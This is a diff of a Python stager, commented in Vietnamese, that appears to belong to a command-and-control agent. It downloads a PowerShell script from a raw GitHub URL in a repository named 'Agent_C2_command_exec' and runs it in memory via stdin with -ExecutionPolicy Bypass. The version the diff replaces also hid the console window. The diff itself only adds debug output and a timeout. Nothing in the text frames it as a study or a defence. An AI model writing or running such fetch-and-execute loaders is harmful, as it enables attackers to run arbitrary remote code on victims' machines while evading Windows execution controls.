@@ -3,21 +3,19 @@ import subprocess
 import sys
 
 def execute_in_memory(url):
+    print(f"[*] Đang kết nối tới GitHub: {url}")
     try:
-        # 1. Tải script PowerShell từ GitHub Raw
-        response = requests.get(url)
+        response = requests.get(url, timeout=10)
         if response.status_code != 200:
-            print(f"[-] Không thể tải script. Mã lỗi: {response.status_code}")
+            print(f"[-] Lỗi tải script: HTTP {response.status_code}")
             return
         
         ps_script = response.text
+        print(f"[+] Đã tải script ({len(ps_script)} bytes). Đang nạp vào RAM...")
 
-        # 2. Thực thi PowerShell trực tiếp trong RAM thông qua stdin
-        # -ExecutionPolicy Bypass: Bỏ qua các ràng buộc thực thi trên Windows
-        # -WindowStyle Hidden: Chạy ẩn (nếu muốn agent không hiện cửa sổ)
-        # -Command -: Đọc lệnh từ luồng dữ liệu (stdin)
+        # BỎ "-WindowStyle Hidden" khi debug để dễ quan sát nếu cần
         process = subprocess.Popen(
-            ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", "-"],
+            ["powershell", "-ExecutionPolicy", "Bypass", "-Command", "-"],
             stdin=subprocess.PIPE,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
@@ -25,18 +23,20 @@ def execute_in_memory(url):
             encoding='utf-8'
         )
 
-        # Đẩy mã script vào tiến trình và đợi kết quả
+        print("[*] Đang thực thi lệnh PowerShell...")
         stdout, stderr = process.communicate(input=ps_script)
 
         if stdout:
-            print(f"[+] Kết quả:\n{stdout}")
+            print(f"\n[OUTPUT FROM PS]:\n{stdout}")
         if stderr:
-            print(f"[-] Lỗi phát sinh:\n{stderr}")
+            print(f"\n[ERROR FROM PS]:\n{stderr}")
+        
+        print(f"[*] Tiến trình kết thúc với mã: {process.returncode}")
 
     except Exception as e:
-        print(f"[-] Đã xảy ra lỗi hệ thống: {e}")
+        print(f"[-] Lỗi Python: {e}")
 
 if __name__ == "__main__":
-    # Link GitHub của bạn
+    # Đảm bảo link này là bản mới nhất bạn đã sửa
     GITHUB_RAW_URL = "https://raw.githubusercontent.com/thedarkassasin/Agent_C2_command_exec/main/ps.txt"
     execute_in_memory(GITHUB_RAW_URL)
